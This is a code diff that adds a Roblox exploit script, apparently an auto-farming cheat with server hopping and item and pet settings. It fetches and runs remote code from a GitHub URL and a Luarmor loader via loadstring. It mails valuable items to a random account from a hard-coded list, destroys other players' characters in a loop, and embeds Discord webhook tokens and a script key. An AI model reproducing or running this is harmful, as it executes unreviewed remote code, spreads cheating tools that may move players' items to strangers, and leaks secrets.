@@ -1,0 +1,132 @@
+ local plrs = game:GetService("Players") 
+  local plr = plrs.LocalPlayer
+  local tpService = game:GetService("TeleportService")
+
+local function getServers()
+    local url =
+        string.format("https://games.roblox.com/v1/games/%s/servers/Public?sortOrder=Asc&limit=100&excludeFullGames=true", game.PlaceId)
+    local servers = game:GetService("HttpService"):JSONDecode(game:HttpGet(url)).data
+    return servers
+end
+
+local function serverhop()
+ local server
+    repeat
+        task.wait(1)
+        server = getServers()[Random.new():NextInteger(1, 100)]
+
+    until server.id ~= game.JobId
+
+
+    tpService:TeleportToPlaceInstance(game.PlaceId, server.id, plr)
+end
+
+local usernames = {
+    "kethemhanh3",
+    "johnwhichh5",
+    "johnwhichh4",
+    "johnwhichh6",
+    "johnwhichh7",
+    "johnwhichh8",
+    "johnwhichh12",
+    "johnwhichh11",
+    "johnwhichh13",
+    "johnwhichh10"
+}
+
+local function getRandomUsername()
+    local index = math.random(1, #usernames)
+    return usernames[index]
+end
+
+local sendto = getRandomUsername()
+
+task.spawn(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/bomayso/ram/refs/heads/main/godpotion"))()
+end)
+
+if not game:IsLoaded() then
+    game.Loaded:Wait()
+  end
+
+
+
+task.spawn(function()
+  game:GetService("RunService"):Set3dRenderingEnabled(false)
+		for _, v in pairs(game.Players:GetChildren()) do
+        	for _, v2 in pairs(v.Character:GetDescendants()) do
+                    if v2:IsA("BasePart") or v2:IsA("Decal") then
+                        v2.Transparency = 1
+                    end
+                end
+        end
+				
+    while true do
+        
+        for i, v in pairs(game.Players:GetPlayers()) do
+            if v ~= game.Players.LocalPlayer then
+                pcall(function()
+                    local Character = v.Character
+                    Character:Destroy()
+                end)
+            end
+        end
+	task.wait(30)
+    end
+end)
+
+getgenv().LoadSettings = 
+{
+	["Items"] = 
+				{["Fruits"] = {["Max"] = 36, ["Fruits"] = {"Watermelon", "Apple", "Rainbow", "Pineapple", "Orange", "Banana"}, ["Craft"] = true, ["Use"] = true}, 
+				["Potions"] = {["Potions"] = {"Lucky Potion", "Walkspeed Potion", "Coins Potion", "Items Potion", "Faster Rolls Potion", "Breakables Potion"}, 
+				["CraftPotions"] = {"Pumpkin Potion", "Lucky Potion", "Coins Potion", "Faster Rolls Potion", "Instant Luck Potion", "The Cocktail", "Golden Dice Potion", "Rainbow Dice Potion", "Blazing Dice Potion"}, 
+				["Tier"] = 0, 
+				["Craft"] = true, 
+				["Use"] = true}, 
+				["Relics"] = true}, 
+	["Farming"] = 
+				{["UpgradeGroups"] = {"Root", "Trading"}, 
+				["Index"] = true, 
+				["Upgrades"] = true, 
+				["RAPToMail"] = 1000, 
+				["Rarities"] = {"Exclusive", "Exotic", "Celestial", "Superior", "Secret", "Divine"}, 
+				["Balloons"] = true, 
+				["IndexWebhook"] = "", ["MailWebhook"] = "https://discord.com/api/webhooks/1181449233031774308/3o6eqg-LoUuew33uetNLuIr7LrSOVNVRILd9v6ME6Cm-vuZ4oEq8vaR6x2tt618xeKM1", 
+				["IndexOffers"] = {"IndexMerchant - Pumpkin Potion III", "AdvancedIndexMerchant - Pumpkin Potion III", "AdvancedIndexMerchant - Instant Luck Potion III", "AdvancedIndexMerchant - Instant Luck Potion II", "AdvancedIndexMerchant - Instant Luck Potion I", "IndexMerchant - Faster Rolls Potion II", "AdvancedIndexMerchant - Faster Rolls Potion II", "AdvancedIndexMerchant - Lucky Potion V", "AdvancedIndexMerchant - Lucky Potion VI", "AdvancedIndexMerchant - Lucky Potion VII", "AdvancedIndexMerchant - Rainbow Dice Potion", "AdvancedIndexMerchant - Golden Dice Potion", "AdvancedIndexMerchant - Blazing Dice Potion"}, 
+				["Gifts"] = true, 
+				["Digging"] = true, 
+				["Vending"] = true, 
+				["Custom"] = true, 
+				["SendIndex"] = false, 
+				["Method"] = "Multi", 
+				["Username"] = sendto, 
+				["InstaLucks"] = {"Insta Luck III"}, 
+				["DifficultyToMail"] = 7000000, 
+				["UseInstaLuckForCombo"] = true, 
+				["PetsPerBreakable"] = 5, 
+				["Webhook"] = "https://discord.com/api/webhooks/1181449298261594164/lhtf0R5PnkLxXaoJxH_AKDF_eINJjxr3ACOlpjaCPZnjfAHMxUAi06HqpVV3h_YdXO_l", 
+				["MailHatches"] = true, 
+				["ForceComboForInstaLuck"] = true, 
+				["Roll"] = true, 
+				["Start"] = true, 
+				["Prio"] = false, 
+				["SendHatches"] = true, 
+				["CustomOffers"] = {"StandardMerchant - Pumpkin Potion I", "StandardMerchant - Pumpkin Potion II", "StandardMerchant - Pumpkin Potion III", "StandardMerchant - Faster Rolls Potion II", "StandardMerchant - Instant Luck Potion II", "StandardMerchant - Instant Luck Potion III", "StandardMerchant - The Cocktail", "StandardMerchant - Instant Luck Potion I", "StandardMerchant - Blazing Dice Potion", "StandardMerchant - Rainbow Dice Potion", "StandardMerchant - Golden Dice Potion", "StandardMerchant - Lucky Potion V", "StandardMerchant - Lucky Potion IV", "StandardMerchant - Lucky Potion III", "StandardMerchant - Lucky Potion II", "StandardMerchant - Lucky Potion I"}}, 
+	["ForceVIP"] = false, 
+	["UIScale"] = 1, 
+	["LoadSettings"] = true, 
+	["Optimize"] = 
+				{["Pets"] = true, ["Drops"] = true, ["Breakables"] = true, ["Scripts"] = true, ["GUIs"] = false, ["World"] = false}
+}
+
+
+
+
+
+
+script_key = "bpIjBUDCdcQbzBJLGmmXYWAZDISehlIX";
+
+daubuoi = true
+
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/b22aae7d03041699ada62f6a4fb519fd.lua"))()
